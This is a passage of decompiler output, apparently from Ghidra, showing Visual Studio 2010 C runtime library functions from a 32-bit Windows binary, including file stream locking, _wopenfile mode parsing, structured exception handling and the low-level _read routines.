    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x4161bf < _File) && (_File < (FILE *)0x416421)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0040da13(((int)(_File + -0x20b0e) >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0040da13(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  wchar_t wVar4;
  int *piVar5;
  uint uVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  int local_c;
  uint local_8;
  
  bVar2 = false;
  local_c = 0;
  bVar3 = false;
  for (pwVar10 = _Mode; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  wVar4 = *pwVar10;
  if (wVar4 == L'a') {
    _OpenFlag = 0x109;
LAB_00408257:
    local_8 = DAT_00417c88 | 2;
  }
  else {
    if (wVar4 != L'r') {
      if (wVar4 != L'w') {
        piVar5 = __errno();
        *piVar5 = 0x16;
        FUN_004071df();
        return (FILE *)0x0;
      }
      _OpenFlag = 0x301;
      goto LAB_00408257;
    }
    _OpenFlag = 0;
    local_8 = DAT_00417c88 | 1;
  }
  pwVar10 = pwVar10 + 1;
  wVar4 = *pwVar10;
  bVar1 = true;
  if (wVar4 != L'\0') {
    do {
      if (!bVar1) break;
      uVar6 = (uint)(ushort)wVar4;
      if (uVar6 < 0x54) {
        if (uVar6 == 0x53) {
          if (local_c != 0) goto LAB_00408385;
          local_c = 1;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (uVar6 != 0x20) {
          if (uVar6 == 0x2b) {
            if ((_OpenFlag & 2) != 0) goto LAB_00408385;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            local_8 = local_8 & 0xfffffffc | 0x80;
          }
          else if (uVar6 == 0x2c) {
            bVar3 = true;
LAB_00408385:
            bVar1 = false;
          }
          else if (uVar6 == 0x44) {
            if ((_OpenFlag & 0x40) != 0) goto LAB_00408385;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (uVar6 == 0x4e) {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (uVar6 != 0x52) goto LAB_00408451;
            if (local_c != uVar6 - 0x52) goto LAB_00408385;
            local_c = 1;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (uVar6 == 0x54) {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_00408385;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (uVar6 == 0x62) {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00408385;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (uVar6 == 99) {
        if (bVar2) goto LAB_00408385;
        local_8 = local_8 | 0x4000;
        bVar2 = true;
      }
      else if (uVar6 == 0x6e) {
        if (bVar2) goto LAB_00408385;
        local_8 = local_8 & 0xffffbfff;
        bVar2 = true;
      }
      else {
        if (uVar6 != 0x74) goto LAB_00408451;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00408385;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar10 = pwVar10 + 1;
      wVar4 = *pwVar10;
    } while (wVar4 != L'\0');
    if (bVar3) {
      for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      iVar7 = _wcsncmp((wchar_t *)&DAT_00412270,pwVar10,3);
      if (iVar7 != 0) goto LAB_00408451;
      for (pwVar10 = pwVar10 + 3; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
      }
      if (*pwVar10 != L'=') goto LAB_00408451;
      do {
        pwVar9 = pwVar10;
        pwVar10 = pwVar9 + 1;
      } while (*pwVar10 == L' ');
      iVar7 = __wcsnicmp(pwVar10,u_UTF_8_00412278,5);
      if (iVar7 == 0) {
        pwVar10 = pwVar9 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar10,u_UTF_16LE_00412284,8);
        if (iVar7 == 0) {
          pwVar10 = pwVar9 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar10,u_UNICODE_00412298,7);
          if (iVar7 != 0) goto LAB_00408451;
          pwVar10 = pwVar9 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar10 == L' '; pwVar10 = pwVar10 + 1) {
  }
  if (*pwVar10 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_00417288 = _DAT_00417288 + 1;
    _File->_flag = local_8;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_00408451:
  piVar5 = __errno();
  *piVar5 = 0x16;
  FUN_004071df();
  return (FILE *)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __getstream(void)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *pvVar4;
  BOOL BVar5;
  int _Index;
  FILE *pFVar6;
  FILE *_File;
  
  pFVar6 = (FILE *)0x0;
  __lock(1);
  _Index = 0;
  do {
    _File = pFVar6;
    if (DAT_00419fc0 <= _Index) {
LAB_004085a1:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_004085d2();
      return _File;
    }
    piVar1 = (int *)(DAT_00418fbc + _Index * 4);
    if (*piVar1 == 0) {
      pvVar4 = __malloc_crt(0x38);
      *(void **)(DAT_00418fbc + _Index * 4) = pvVar4;
      if (pvVar4 != (void *)0x0) {
        BVar5 = InitializeCriticalSectionAndSpinCount
                          ((LPCRITICAL_SECTION)(*(int *)(DAT_00418fbc + _Index * 4) + 0x20),4000);
        if (BVar5 == 0) {
          _free(*(void **)(DAT_00418fbc + _Index * 4));
          *(undefined4 *)(DAT_00418fbc + _Index * 4) = 0;
        }
        else {
          EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_00418fbc + _Index * 4) + 0x20));
          _File = *(FILE **)(DAT_00418fbc + _Index * 4);
          _File->_flag = 0;
        }
      }
      goto LAB_004085a1;
    }
    uVar2 = *(uint *)(*piVar1 + 0xc);
    if (((uVar2 & 0x83) == 0) && ((uVar2 & 0x8000) == 0)) {
      if ((_Index - 3U < 0x11) && (iVar3 = __mtinitlocknum(_Index + 0x10), iVar3 == 0))
      goto LAB_004085a1;
      __lock_file2(_Index,*(void **)(DAT_00418fbc + _Index * 4));
      _File = *(FILE **)(DAT_00418fbc + _Index * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_004085a1;
      __unlock_file2(_Index,_File);
    }
    _Index = _Index + 1;
  } while( true );
}



void FUN_004085d2(void)

{
  FUN_0040da13(1);
  return;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_00416048 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2010 Release

undefined4 __cdecl __except_handler4(PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  int iVar2;
  BOOL BVar3;
  PVOID pvVar4;
  int *piVar5;
  PEXCEPTION_RECORD local_1c;
  undefined4 local_18;
  PVOID *local_14;
  undefined4 local_10;
  PVOID local_c;
  char local_5;
  
  piVar5 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_00416048);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  pvVar4 = param_2;
  if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {
    *(PEXCEPTION_RECORD **)((int)param_2 + -4) = &local_1c;
    pvVar4 = *(PVOID *)((int)param_2 + 0xc);
    local_1c = param_1;
    local_18 = param_3;
    if (pvVar4 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (PVOID *)(piVar5 + (int)pvVar4 * 3 + 4);
      local_c = *local_14;
      if ((undefined *)piVar5[(int)pvVar4 * 3 + 5] != (undefined *)0x0) {
        iVar2 = __EH4_CallFilterFunc_8((undefined *)piVar5[(int)pvVar4 * 3 + 5]);
        local_5 = '\x01';
        if (iVar2 < 0) {
          local_10 = 0;
          goto LAB_004086e8;
        }
        if (0 < iVar2) {
          if (((param_1->ExceptionCode == 0xe06d7363) && (DAT_00418fb8 != (code *)0x0)) &&
             (BVar3 = __IsNonwritableInCurrentImage((PBYTE)&DAT_00418fb8), BVar3 != 0)) {
            (*DAT_00418fb8)(param_1,1);
          }
          __EH4_GlobalUnwind2_8(param_2,param_1);
          if (*(PVOID *)((int)param_2 + 0xc) != pvVar4) {
            __EH4_LocalUnwind_16((int)param_2,(uint)pvVar4,iVar1,&DAT_00416048);
          }
          *(PVOID *)((int)param_2 + 0xc) = local_c;
          if (*piVar5 != -2) {
            ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
          }
          ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          goto LAB_004087af;
        }
      }
      pvVar4 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_004087af:
    if (*(int *)((int)pvVar4 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar4,0xfffffffe,iVar1,&DAT_00416048);
  }
LAB_004086e8:
  if (*piVar5 != -2) {
    ___security_check_cookie_4(piVar5[1] + iVar1 ^ *(uint *)(*piVar5 + iVar1));
  }
  ___security_check_cookie_4(piVar5[3] + iVar1 ^ *(uint *)(piVar5[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Library: Visual Studio 2010 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_00408860;
  pvStack_28 = ExceptionList;
  local_20 = DAT_00416048 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_0040e784();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_004088a6(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x004088f0. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind2@8
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_GlobalUnwind2_8(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  RtlUnwind(param_1,(PVOID)0x408906,param_2,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2010 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2010 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_004071df();
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00416540;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00418ea0)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_00418e90 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    FUN_004071df();
    return -1;
  }
  piVar6 = &DAT_00418ea0 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + 4 + iVar14);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_00408b43;
  }
  if (_MaxCharCount < 0x80000000) {
    local_10 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + 0x24 + iVar14) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_00408b31;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        psVar12 = (short *)__malloc_crt(_MaxCharCount);
        local_14 = psVar12;
        if (psVar12 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_00408b31;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_14 = (short *)_DstBuf;
        psVar12 = (short *)_DstBuf;
      }
      psVar8 = psVar12;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        uVar7 = _MaxCharCount - 1;
        *(char *)psVar12 = cVar4;
        psVar8 = (short *)((int)psVar12 + 1);
        local_10 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = psVar12 + 1;
          uVar7 = _MaxCharCount - 2;
          local_10 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)psVar12 + 3);
            local_10 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_00408e50;
          }
          goto LAB_00408e45;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_10 = (short *)((int)local_10 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_00408e50;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*psVar12 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_10 = (short *)((int)local_10 + (int)local_14);
          _MaxCharCount = (uint)local_14;
          psVar12 = local_14;
          if (local_14 < local_10) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar12 = *(short *)_MaxCharCount;
                  psVar12 = psVar12 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_10 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_00408ef0;
                  }
LAB_00408f83:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_00408f85:
                  *psVar12 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_00408f83;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar12 == local_14) && (local_c == 10)) goto LAB_00408ef0;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_00408f8c;
                    goto LAB_00408f83;
                  }
                  if (local_c == 10) {
LAB_00408ef0:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_00408f85;
                  }
                  *psVar12 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar12 = psVar12 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar12 = sVar17;
                psVar12 = psVar12 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_00408f8c:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_10);
          }
          local_10 = (short *)((int)psVar12 - (int)local_14);
          goto LAB_00408e50;
        }
        if ((local_1c == 0) || (*(char *)psVar12 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_10 = (short *)((int)local_10 + (int)local_14);
        _MaxCharCount = (uint)local_14;
        psVar12 = local_14;
        if (local_14 < local_10) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar12 = *(undefined *)_MaxCharCount;
                psVar12 = (short *)((int)psVar12 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_10 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_00408cd0;
                }
LAB_00408d47:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar12 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_00408d47;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar12 == local_14) && (local_5 == '\n')) goto LAB_00408cd0;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_00408d4b;
                  goto LAB_00408d47;
                }
                if (local_5 == '\n') {
LAB_00408cd0:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar12 = 10;
                }
                else {
                  *(undefined *)psVar12 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar12 = (short *)((int)psVar12 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar12 = cVar4;
              psVar12 = (short *)((int)psVar12 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_00408d4b:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_10);
        }
        local_10 = (short *)((int)psVar12 - (int)local_14);
        if ((local_6 != '\x01') || (local_10 == (short *)0x0)) goto LAB_00408e50;
        bVar3 = *(byte *)(short *)((int)psVar12 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar12 = (short *)((int)psVar12 + -1);
          while ((((&DAT_00416440)[bVar3] == '\0' && (iVar13 < 5)) && (local_14 <= psVar12))) {
            psVar12 = (short *)((int)psVar12 + -1);
            bVar3 = *(byte *)psVar12;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_00416440)[*(byte *)psVar12] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_00408e4c;
          }
          if ((char)(&DAT_00416440)[*(byte *)psVar12] + 1 == iVar13) {
            psVar12 = (short *)((int)psVar12 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + 4 + iVar14) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar8 = (short *)((int)psVar12 + 1);
            *(byte *)(*piVar6 + 5 + iVar14) = *(byte *)psVar12;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar8;
              psVar8 = psVar12 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar8;
              psVar8 = (short *)((int)psVar8 + 1);
            }
            psVar12 = (short *)((int)psVar8 - iVar13);
          }
        }
        iVar13 = (int)psVar12 - (int)local_14;
        local_10 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_14,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_10 != (short *)0x0) {
          bVar15 = local_10 != (short *)iVar13;
          local_10 = (short *)((int)local_10 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_00408e50;
        }
        uVar11 = GetLastError();
LAB_00408e45:
        __dosmaperr(uVar11);
      }
LAB_00408e4c:
      local_18 = -1;
LAB_00408e50:
      if (local_14 != (short *)_DstBuf) {
        _free(local_14);
      }
      if (local_18 == -2) {
        return (int)local_10;
      }
      return local_18;
    }
  }
LAB_00408b31:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_00408b43:
  FUN_004071df();
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2010 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_004090eb();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
